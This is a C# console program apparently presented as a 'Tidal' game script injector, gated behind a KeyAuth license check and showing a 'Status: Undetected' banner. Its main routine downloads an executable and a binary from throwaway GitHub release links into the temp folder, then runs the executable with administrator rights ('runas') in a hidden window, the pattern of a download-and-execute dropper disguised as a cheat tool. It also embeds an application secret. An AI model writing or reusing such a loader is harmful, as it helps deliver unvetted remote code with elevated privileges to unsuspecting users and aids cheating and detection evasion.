﻿using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using KeyAuth;

namespace TidalInjectionWOW
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Program.KeyAuthApp.init();
            Console.ForegroundColor = ConsoleColor.Cyan;
            Program.PrintGradient();
            Console.WriteLine("\n\n Enter license, Get a license key at: https://direct-link.net/1176266/24-hour-keys-for-ro-as ");
            string text = Console.ReadLine();
            Program.KeyAuthApp.license(text);
            bool flag = !Program.KeyAuthApp.response.success;
            if (flag)
            {
                Console.WriteLine("\n Status: " + Program.KeyAuthApp.response.message);
                Thread.Sleep(2500);
                Environment.Exit(0);
            }
            Console.WriteLine("Injecting... Tidal V2....");
            string text2 = "https://github.com/httpspy/tw3rw/releases/download/weaewae/TidalInjector.exe";
            string text3 = Path.Combine(Path.GetTempPath(), "TidalInjector.exe");
            using (WebClient webClient = new WebClient())
            {
                webClient.DownloadFile(text2, text3);
            }
            string text4 = "https://github.com/X-Ware-Anti-Cheat/dwaddwawda/releases/download/injection/CeleryIn.bin";
            string text5 = Path.Combine(Path.GetTempPath(), "CeleryIn.bin");
            using (WebClient webClient2 = new WebClient())
            {
                webClient2.DownloadFile(text4, text5);
            }
            ProcessStartInfo processStartInfo = new ProcessStartInfo
            {
                FileName = text3,
                Verb = "runas",
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true,
                CreateNoWindow = true
            };
            try
            {
                Process process = Process.Start(processStartInfo);
                Console.WriteLine("Injected! You're now ready to use Tidal!");
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred: " + ex.Message);
            }
            Console.ResetColor();
            Console.ReadLine();
        }

        private static void PrintGradient()
        {
            string text = "▄▄▄█████▓ ██▓▓█████▄  ▄▄▄       ██▓    \r\n▓  ██▒ ▓▒▓██▒▒██▀ ██▌▒████▄    ▓██▒    \r\n▒ ▓██░ ▒░▒██▒░██   █▌▒██  ▀█▄  ▒██░    \r\n░ ▓██▓ ░ ░██░░▓█▄   ▌░██▄▄▄▄██ ▒██░    \r\n  ▒██▒ ░ ░██░░▒████▓  ▓█   ▓██▒░██████▒\r\n  ▒ ░░   ░▓   ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒░▓  ░\r\n    ░     ▒ ░ ░ ▒  ▒   ▒   ▒▒ ░░ ░ ▒  ░\r\n  ░       ▒ ░ ░ ░  ░   ░   ▒     ░ ░   \r\n          ░     ░          ░  ░    ░  ░\r\n              ░                        ";
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Status: Undetected");
            ConsoleColor[] array = new ConsoleColor[]
            {
                ConsoleColor.Magenta,
                ConsoleColor.Red,
                ConsoleColor.DarkMagenta
            };
            int num = 0;
            foreach (char c in text)
            {
                bool flag = c != '\r' && c != '\n';
                if (flag)
                {
                    Console.ForegroundColor = array[num];
                    num = (num + 1) % array.Length;
                }
                Console.Write(c);
            }
            Console.WriteLine();
        }

        private static api KeyAuthApp = new api("Tidal", "5lzd5UM235", "ff3ccf4436f486042d06915690ea5e422604c12981a5bc72ac18844835b6a25e", "1.0");
    }
}